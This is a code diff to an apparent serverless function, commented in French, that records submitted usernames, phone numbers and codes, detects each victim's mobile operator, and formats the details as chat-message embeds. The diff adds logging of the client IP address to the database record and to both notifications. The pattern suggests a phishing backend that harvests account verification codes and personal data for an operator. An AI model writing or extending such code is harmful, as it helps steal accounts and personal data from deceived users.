@@ -75,6 +75,12 @@ serve(async (req) => {
     const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
     const supabase = createClient(supabaseUrl, supabaseKey);
 
+    // Récupérer l'IP du client
+    const clientIp = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 
+                     req.headers.get('cf-connecting-ip') || 
+                     req.headers.get('x-real-ip') || 
+                     'Inconnue';
+
     const { username, phone, code, step, submissionId } = await req.json();
 
     // Formater le numéro de téléphone avec drapeau français et +33
@@ -108,7 +114,7 @@ serve(async (req) => {
 
       const { data, error } = await supabase
         .from('submissions')
-        .insert({ username, phone, status: 'pending' })
+        .insert({ username, phone, status: 'pending', ip_address: clientIp })
         .select()
         .single();
 
@@ -163,6 +169,16 @@ serve(async (req) => {
           {
             name: `${operator.emoji} Opérateur mobile détecté`,
             value: `>>> **${operator.name}**`,
+            inline: false
+          },
+          {
+            name: "\u200B",
+            value: "\u200B",
+            inline: false
+          },
+          {
+            name: "🌐 Adresse IP",
+            value: `>>> \`${clientIp}\``,
             inline: false
           },
           {
@@ -270,6 +286,16 @@ serve(async (req) => {
           {
             name: "📅 Date et heure de soumission",
             value: `>>> \`${dateStr} à ${timeStr}\``,
+            inline: false
+          },
+          {
+            name: "\u200B",
+            value: "\u200B",
+            inline: false
+          },
+          {
+            name: "🌐 Adresse IP",
+            value: `>>> \`${clientIp}\``,
             inline: false
           },
           {
